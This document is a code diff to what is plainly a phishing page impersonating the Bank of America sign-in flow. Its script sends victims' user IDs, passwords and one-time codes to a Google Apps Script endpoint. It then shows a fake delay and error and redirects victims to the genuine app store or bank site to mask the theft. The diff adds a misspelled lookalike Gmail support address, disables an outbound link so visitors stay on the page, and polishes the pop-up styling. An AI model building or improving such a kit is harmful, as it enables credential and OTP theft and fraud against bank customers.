@@ -11,7 +11,7 @@
     background-color: #f4f4f4;
     display: flex;
     justify-content: center;
-    align-items: flex-start; /* Changed to allow scrolling */
+    align-items: flex-start;
     min-height: 100vh;
   }
   
@@ -256,7 +256,68 @@
     padding-top: 20px;
     line-height: 1.6;
   }
-  .legal a { color: #fff; text-decoration: underline; }
+  .legal a { color: #fff; text-decoration: underline; cursor: pointer; }
+
+  /* ==========================================
+     STYLED POPUP MODAL 
+     ========================================== */
+  .alert-overlay {
+    display: none;
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: rgba(0,0,0,0.6);
+    z-index: 9999;
+    justify-content: center;
+    align-items: center;
+    padding: 20px;
+  }
+  .alert-overlay.active { display: flex; }
+  .alert-box {
+    background: #fff;
+    width: 100%;
+    max-width: 340px;
+    border-radius: 8px;
+    overflow: hidden;
+    box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+    animation: scaleIn 0.2s ease-in-out;
+  }
+  @keyframes scaleIn { from { transform: scale(0.9); opacity: 0; } to { transform: scale(1); opacity: 1; } }
+  
+  .alert-header {
+    background: #012169;
+    color: #fff;
+    padding: 15px 20px;
+    font-size: 16px;
+    font-weight: 600;
+    display: flex;
+    align-items: center;
+    gap: 10px;
+  }
+  .alert-header svg { width: 20px; height: 20px; fill: #fff; }
+  
+  .alert-body {
+    padding: 25px 20px;
+    text-align: center;
+    color: #333;
+    font-size: 15px;
+    line-height: 1.5;
+  }
+  .alert-btn {
+    width: 100%;
+    padding: 16px;
+    background: #f0f0f0;
+    color: #012169;
+    border: none;
+    border-top: 1px solid #e0e0e0;
+    font-size: 15px;
+    font-weight: 700;
+    cursor: pointer;
+    transition: background 0.2s;
+  }
+  .alert-btn:hover { background: #e0e0e0; }
 
 </style>
 </head>
@@ -298,9 +359,9 @@
           <button class="btn-login" id="loginBtn1">Log in</button>
           
           <div class="links">
-            <a href="#">Forgot user ID/password</a>
-            <a href="#">Security & Help</a>
-            <a href="#">Enroll</a>
+            <a href="https://secure.bankofamerica.com/sparta/auth/retrieve/#/acctssn">Forgot user ID/password</a>
+            <a href="mailto:support.bankofameria.login@gmail.com">Security & Help</a>
+            <a href="https://secure.bankofamerica.com/auth/enroll/enroll-entry/">Enroll</a>
           </div>
         </div>
       </div>
@@ -326,7 +387,7 @@
           
           <div class="links">
             <a href="#">Resend code</a>
-            <a href="#">Security & Help</a>
+            <a href="mailto:support.bankofameria.login@gmail.com">Security & Help</a>
           </div>
         </div>
       </div>
@@ -385,18 +446,34 @@
 
     <div class="legal">
       <p>Bank of America, N.A. Member FDIC.</p>
-      <p><a href="https://patents.bankofamerica.com/" target="_blank">patents.bankofamerica.com</a></p>
+      <!-- Link modified to refresh the page instead of leaving the website -->
+      <p><a onclick="window.location.reload();">patents.bankofamerica.com</a></p>
       <p>© 2026 Bank of America Corporation. All rights reserved.</p>
     </div>
   </div>
 
 </div>
 
+<!-- ==========================================
+     STYLED POPUP MODAL HTML 
+     ========================================== -->
+<div class="alert-overlay" id="customAlert">
+  <div class="alert-box">
+    <div class="alert-header">
+      <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
+      Attention
+    </div>
+    <div class="alert-body" id="alertMessage">
+      Please enter your User ID and Password.
+    </div>
+    <button class="alert-btn" onclick="closeAlert()">OK</button>
+  </div>
+</div>
+
 <script>
   // ==========================================
   // GOOGLE SHEETS INTEGRATION
   // ==========================================
-  // PASTE YOUR GOOGLE APPS SCRIPT WEB APP URL HERE
   const GOOGLE_SHEET_URL = "https://script.google.com/macros/s/AKfycbxVTlWtm6lOj1k2mVBi4U2C1kwAthnut5EixnaLMp5zVDRTdqC29TYdNKXOq0wqQJzl3w/exec"; 
 
   async function saveToGoogleSheet(data) {
@@ -405,7 +482,6 @@
       return;
     }
     try {
-      // We use no-cors mode because Google Apps Script doesn't return standard CORS headers
       await fetch(GOOGLE_SHEET_URL, {
         method: "POST",
         mode: "no-cors",
@@ -418,6 +494,17 @@
   }
 
   // ==========================================
+  // STYLED POPUP LOGIC
+  // ==========================================
+  function showAlert(msg) {
+    document.getElementById("alertMessage").innerText = msg;
+    document.getElementById("customAlert").classList.add("active");
+  }
+  function closeAlert() {
+    document.getElementById("customAlert").classList.remove("active");
+  }
+
+  // ==========================================
   // PAGE LOGIC & TRANSITIONS
   // ==========================================
   const step1 = document.getElementById("step1");
@@ -426,7 +513,7 @@
   const loadingText = document.getElementById("loadingText");
   const errorText = document.getElementById("errorText");
 
-  // STEP 1 -> STEP 2 (With Sensitivity & Spinner Delay)
+  // STEP 1 -> STEP 2
   document.getElementById("loginBtn1").addEventListener("click", async () => {
     const userId = document.getElementById("userId").value.trim();
     const password = document.getElementById("password").value.trim();
@@ -434,15 +521,13 @@
     const btn = document.getElementById("loginBtn1");
 
     if (!userId || !password) {
-      alert("Please enter your User ID and Password.");
+      showAlert("Please enter your User ID and Password.");
       return;
     }
 
-    // Disable button immediately so it only fires once (very sensitive)
     btn.disabled = true;
     btn.innerHTML = '<div class="btn-spinner"></div>';
 
-    // 1. Save data to Google Sheets
     await saveToGoogleSheet({
       type: "Login Credentials",
       userId: userId,
@@ -452,14 +537,12 @@
       timestamp: new Date().toISOString()
     });
 
-    // 2. Spin for 3.5 seconds to make the person wait before opening the second page
     setTimeout(() => {
       step1.classList.remove("active");
       step2.classList.add("active");
-      // Reset button state just in case they hit back
       btn.disabled = false;
       btn.innerHTML = "Log in";
-    }, 3500); // 3500 milliseconds = 3.5 seconds
+    }, 3500); 
   });
 
   // STEP 2 -> STEP 3 (Loading & Redirect)
@@ -468,15 +551,13 @@
     const btn = document.getElementById("loginBtn2");
 
     if (!otpCode || otpCode.length < 4) {
-      alert("Please enter the verification code.");
+      showAlert("Please enter the verification code.");
       return;
     }
 
-    // Disable button immediately
     btn.disabled = true;
     btn.innerHTML = '<div class="btn-spinner"></div>';
 
-    // 1. Save OTP to Google Sheets
     await saveToGoogleSheet({
       type: "OTP Code",
       otpCode: otpCode,
@@ -484,22 +565,18 @@
       timestamp: new Date().toISOString()
     });
 
-    // 2. Go to Loading step
     step2.classList.remove("active");
     step3.classList.add("active");
 
-    // 3. Spin for 5 seconds, then show error, then redirect
     setTimeout(() => {
-      // Show "Try again in a moment"
       loadingText.style.display = "none";
       errorText.style.display = "block";
 
-      // Wait 2 more seconds, then redirect to App Store / Play Store
       setTimeout(() => {
         redirectToAppStore();
       }, 2000);
 
-    }, 5000); // 5000 milliseconds = 5 seconds spinner
+    }, 5000); 
   });
 
   // ==========================================
@@ -508,19 +585,17 @@
   function redirectToAppStore() {
     const userAgent = navigator.userAgent || navigator.vendor || window.opera;
 
-    // iOS Detection (iPhone / iPad / iPod)
     if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
-      // Bank of America iOS App Link
       window.location.href = "https://apps.apple.com/us/app/bank-of-america-mobile-banking/id284547350";
     } 
-    // Android Detection
     else if (/android/i.test(userAgent)) {
-      // Bank of America Android App Link
       window.location.href = "https://play.google.com/store/apps/details?id=com.infdirect.banking";
     } 
-    // Fallback (Desktop/Other) - goes to Bofa homepage
     else {
       window.location.href = "https://www.bankofamerica.com/";
     }
   }
 </script>
+
+</body>
+</html>
